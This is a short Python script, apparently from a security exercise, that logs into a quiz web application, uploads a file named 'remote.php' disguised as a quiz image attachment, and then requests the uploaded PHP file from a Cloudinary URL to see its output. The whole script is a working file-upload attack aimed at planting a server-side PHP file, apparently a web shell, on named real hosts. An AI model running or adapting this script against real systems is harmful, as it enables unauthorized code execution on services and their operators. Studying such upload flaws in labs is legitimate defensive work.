#!/usr/local/bin/python3
import requests
from string import *
import re

s = requests.Session()

username = 'x'
password = 'x'

# login funcional!!

url = 'https://quiz2019.herokuapp.com/session/'
data = {'login': username, 'password': password, 'redir': '/', 'commit': 'Login'}
response = s.post(url, data=data)

url = 'https://quiz2019.herokuapp.com/quizzes/'
data = {'question': 'x', 'answer': 'Error'}

files = {'image': ('fotillo', open('remote.php', 'rb'), {'Expires': '0'})}
s.post(url, data=data, files=files)

response = s.get('https://res.cloudinary.com/core-upm/raw/upload/v1542915882/core/quiz2018/attachments/kzrjpfemz3hlf2qeot4q.php')

print(response.text)
